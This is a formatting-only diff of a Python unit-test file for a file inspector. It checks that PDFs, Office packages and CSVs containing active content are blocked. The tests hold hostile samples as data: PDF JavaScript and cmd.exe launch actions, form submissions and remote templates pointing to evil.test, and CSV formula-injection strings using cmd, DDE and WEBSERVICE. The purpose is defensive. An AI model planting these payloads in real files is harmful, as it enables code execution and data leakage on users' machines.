@@ -67,7 +67,9 @@ def zip_bytes(members: dict[str, bytes], *, encrypted: bool = False) -> bytes:
 
 
 def spreadsheet() -> bytes:
-    return make_xlsx([("Sheet1", sheet_xml('<row r="1"><c r="A1" t="inlineStr"><is><t>Total</t></is></c></row>'))])
+    return make_xlsx(
+        [("Sheet1", sheet_xml('<row r="1"><c r="A1" t="inlineStr"><is><t>Total</t></is></c></row>'))]
+    )
 
 
 def with_member(xlsx: bytes, name: str, data: bytes) -> bytes:
@@ -101,7 +103,7 @@ class OrdinaryFilesPass(unittest.TestCase):
         self.assertIsNone(inspect(with_member(spreadsheet(), "xl/worksheets/_rels/sheet1.xml.rels", rels)))
 
     def test_a_csv_with_negative_numbers_and_a_sum(self) -> None:
-        csv = "Name,Month,Profit\nSharma Traders,Aug 2026,-1234\nTotal,,=SUM(C2:C3)\n".encode()
+        csv = b"Name,Month,Profit\nSharma Traders,Aug 2026,-1234\nTotal,,=SUM(C2:C3)\n"
         self.assertIsNone(inspect(csv))
 
     def test_a_csv_with_a_byte_order_mark(self) -> None:
@@ -121,13 +123,17 @@ class PdfActiveContentIsBlocked(unittest.TestCase):
 
     def test_an_obfuscated_javascript_name(self) -> None:
         # "#61" is "a": /J#61vaScript is /JavaScript to a PDF reader.
-        self.blocked(b"/Names << /J#61vaScript 4 0 R >>", b"<< /Names [(x) 5 0 R] >>", b"<< /S /JavaScript >>")
+        self.blocked(
+            b"/Names << /J#61vaScript 4 0 R >>", b"<< /Names [(x) 5 0 R] >>", b"<< /S /JavaScript >>"
+        )
 
     def test_a_launch_action(self) -> None:
         self.blocked(b"/OpenAction << /S /Launch /F (cmd.exe) >>")
 
     def test_an_embedded_file(self) -> None:
-        self.blocked(b"/Names << /EmbeddedFiles 4 0 R >>", b"<< /Names [(a.exe) 5 0 R] >>", b"<< /Type /Filespec >>")
+        self.blocked(
+            b"/Names << /EmbeddedFiles 4 0 R >>", b"<< /Names [(a.exe) 5 0 R] >>", b"<< /Type /Filespec >>"
+        )
 
     def test_a_form_that_submits_data(self) -> None:
         self.blocked(b"/OpenAction << /S /SubmitForm /F (https://evil.test) >>")
@@ -163,7 +169,9 @@ class OfficePackages(unittest.TestCase):
         self.assertIs(inspect(with_member(spreadsheet(), "xl/vbaProject.bin", b"x")), Finding.BLOCKED)
 
     def test_excel_4_macro_sheets(self) -> None:
-        self.assertIs(inspect(with_member(spreadsheet(), "xl/macrosheets/sheet1.xml", b"<x/>")), Finding.BLOCKED)
+        self.assertIs(
+            inspect(with_member(spreadsheet(), "xl/macrosheets/sheet1.xml", b"<x/>")), Finding.BLOCKED
+        )
 
     def test_activex_and_ole_objects(self) -> None:
         for name in ("xl/activeX/activeX1.xml", "xl/embeddings/oleObject1.bin"):
@@ -186,7 +194,9 @@ class OfficePackages(unittest.TestCase):
             b' Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"'
             b' Target="https://evil.test/t.dotm" TargetMode="External"/></Relationships>'
         )
-        self.assertIs(inspect(with_member(spreadsheet(), "xl/_rels/settings.xml.rels", rels)), Finding.BLOCKED)
+        self.assertIs(
+            inspect(with_member(spreadsheet(), "xl/_rels/settings.xml.rels", rels)), Finding.BLOCKED
+        )
 
     def test_a_password_protected_part_cannot_be_checked(self) -> None:
         self.assertIs(inspect(zip_bytes({"a.xml": b"x"}, encrypted=True)), Finding.UNSCANNABLE)
@@ -212,9 +222,9 @@ class PlainText(unittest.TestCase):
         samples = [
             "Name,Amount\nA,=cmd|' /C calc'!A0\n",
             "Name,Amount\nA,@SUM(1+1)*cmd|' /C calc'!A0\n",
-            "Name,Amount\nA,=DDE(\"cmd\";\"/C calc\";\"x\")\n",
-            "Name,Amount\nA,=HYPERLINK(\"https://evil.test\",\"click\")\n",
-            "Name,Amount\nA,+WEBSERVICE(\"https://evil.test\")\n",
+            'Name,Amount\nA,=DDE("cmd";"/C calc";"x")\n',
+            'Name,Amount\nA,=HYPERLINK("https://evil.test","click")\n',
+            'Name,Amount\nA,+WEBSERVICE("https://evil.test")\n',
         ]
         for sample in samples:
             with self.subTest(sample=sample[12:40]):
